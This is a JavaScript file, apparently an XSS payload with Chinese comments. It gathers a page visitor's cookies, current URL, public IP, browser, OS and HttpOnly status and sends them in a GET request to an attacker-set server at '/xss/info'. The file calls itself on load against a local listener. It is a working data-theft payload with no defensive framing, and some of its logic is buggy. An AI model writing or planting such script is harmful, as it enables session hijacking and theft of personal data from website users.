
function getCurrentTime() {
    const now = new Date();
    var year = now.getFullYear();
    const month = now.getMonth() + 1;
    const day = now.getDate();
    const hours = now.getHours();
    const minutes = now.getMinutes();
    const seconds = now.getSeconds();

    var formattedTime = year + '-' + month + '-' + day + ' ' + hours + ':' + minutes + ':' + seconds;
    return formattedTime;
}


function getUserIP() {
    let request = new XMLHttpRequest();
    request.open('GET', 'https://api.ipify.org?format=json', false); // 设置为false以进行同步请求
    request.send(null);

    if (request.status === 200) {
        let jsonResponse = JSON.parse(request.responseText);
        return jsonResponse.ip;
    } else {
        return "";
    }
}

function getBrowserName(){
    // Detect browser name
    var browserName = "";
    if (navigator.userAgent.indexOf("Chrome") > -1 ) {
        browserName = "Google Chrome";
    } else if(navigator.userAgent.indexOf("Safari") > -1) {
        browserName = "Apple Safari";
    } else if(navigator.userAgent.indexOf("Firefox") > -1) {
        browserName = "Mozilla Firefox";
    } else if(navigator.userAgent.indexOf("Edge") > -1) {
        browserName = "Microsoft Edge";
    } else if(navigator.userAgent.indexOf("Trident") > -1 || navigator.userAgent.indexOf("MSIE") > -1) {
        browserName = "Internet Explorer";
    } else if(navigator.userAgent.indexOf("Opera") > -1 || navigator.userAgent.indexOf("OPR") > -1) {
        browserName = "Opera";
    }

    return browserName
}

function getBrowserVersion(){
    // Detect browser version
    var versionMatch = navigator.userAgent.match(/(Chrome|Firefox|MSIE|Safari|Opera|OPR|Edge|Trident)\/(\d+\.\d+)/i);
    if (versionMatch && versionMatch.length > 2) {
        browserVersion = versionMatch[2];
    }
    return browserVersion
}

function getOsName(){
    // Detect operating system
    if (navigator.userAgent.indexOf("Windows") > -1) {
        os = "Windows";
    } else if (navigator.userAgent.indexOf("Mac OS") > -1) {
        os = "Mac OS";
    } else if (navigator.userAgent.indexOf("Linux") > -1) {
        os = "Linux";
    } else if (navigator.userAgent.indexOf("Android") > -1) {
        os = "Android";
    } else if (navigator.userAgent.indexOf("iPhone") > -1 || navigator.userAgent.indexOf("iPad") > -1) {
        os = "iOS";
    }

    return os;
}

function getArchName(){
    // 获取处理器架构
    var arch = "Unknown";
    if (navigator.hardwareConcurrency && navigator.userAgent.indexOf('WOW64') === -1 && navigator.userAgent.indexOf('Win64') === -1) {
        arch = "64-bit";
    } else {
        arch = "32-bit";
    }
    return arch
}


function checkHttpOnly() {
  // 创建一个测试用的 Cookie
  document.cookie = "testCookie=test;";

  // 尝试读取 Cookie
  var cookieEnabled = document.cookie.indexOf("testCookie") !== -1;

  // 删除测试用的 Cookie
  document.cookie = "testCookie=; expires=Thu, 01 Jan 1970 00:00:00 UTC;";

  // 返回是否启用了 HttpOnly 设置
  return !cookieEnabled ? "true" : "flase";
}


function getGeolocation(){
    // 有bug，服务器获取不了
    var geo = "";
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(function(position) {
            // 获取经度和纬度
            var lat = position.coords.latitude;
            var lng = position.coords.longitude;
            geo = lat + "," + lng;
        });
    } else {
        geo = "";
    }
    return geo
}


/**
 * 获取主机信息，url、cookie、ip、浏览器名称、浏览器版本、操作系统名称、处理器架构、HttpOnly设置、经纬度信息
 */

function getInfo(vps_url) {

    var currentTime = "Unknown";
    var browserName = "Unknown";
    var browserVersion = "Unknown";
    var os = "Unknown";
    var ip = "Unknown";
    var arch = "Unknown";
    var isHttpOnlyEnabled = "Unknown";
    var geolocation = "Unknown";
    var isPrivacySettingsEnabled = "Unknown";

    currentTime = getCurrentTime();
    ip = getUserIP();
    browserName = getBrowserName();
    browserVersion = getBrowserVersion();
    os = getOsName();
    arch = getArchName();
    isHttpOnlyEnabled = checkHttpOnly();
    // geolocation = getGeolocation();

    var currentUrl = window.location.href;
    var cookies = document.cookie;

    // 发送IP到指定的服务器
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    // 发送的服务器地址
    xmlHttp.open("GET", vps_url + "/xss/info?currentTime="+currentTime + "&cookie="+cookies + "&url="+currentUrl+ "&ip="+ ip + "&browserName="+browserName + "&browserVersion="+browserVersion + "&os="+os + "&arch="+arch + "&geolocation="+geolocation + "&httpOnly="+isHttpOnlyEnabled + "&isPrivacySettingsEnabled="+isPrivacySettingsEnabled, "true");
    xmlHttp.send();
}

getInfo("http://127.0.0.1:8888");





